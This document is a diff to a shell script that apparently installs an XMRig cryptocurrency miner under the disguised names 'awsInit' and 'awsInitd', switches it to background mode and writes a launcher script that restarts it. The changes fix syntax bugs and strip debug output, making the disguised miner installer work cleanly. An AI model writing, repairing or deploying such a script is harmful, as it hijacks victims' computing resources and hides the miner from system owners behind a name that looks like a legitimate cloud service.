@@ -256,7 +256,7 @@ if [ "$libc_type" = "musl" ]; then
     fi
 
     echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
-    [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
+    [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
         echo "ERROR: Can't unpack /tmp/data.tar.gz to $working_dir/awsInit directory"
         exit 1
@@ -283,7 +283,7 @@ else
     fi
 
     echo "[*] Unpacking /tmp/xmrig.tar.gz to $working_dir/awsInit"
-    [ -d $working_dir/awsInit] || mkdir $working_dir/awsInit
+    [ -d $working_dir/awsInit ] || mkdir $working_dir/awsInit
     if ! tar xf /tmp/data.tar.gz -C $working_dir/awsInit; then
         echo "ERROR: Can't unpack /tmp/xmrig.tar.gz to $working_dir/awsInit directory"
         exit 1
@@ -336,9 +336,7 @@ sed -i'' 's/"background": *false,/"background": true,/' $working_dir/awsInit/con
 # preparing script
 
 echo "[*] Creating $working_dir/awsInit/init.sh script"
-echo "WTF IS GOING ON"
 if which sh >/dev/null 2>&1; then
-    echo "SH"
     cat >$working_dir/awsInit/init.sh <<EOL
 #!$(which sh)
 if ! pidof awsInitd >/dev/null; then
@@ -346,7 +344,6 @@ if ! pidof awsInitd >/dev/null; then
 fi
 EOL
 elif which bash >/dev/null 2>&1; then
-    echo "BASH"
     cat >$working_dir/awsInit/init.sh <<EOL
 #!$(which bash)
 if ! pidof awsInitd >/dev/null; then
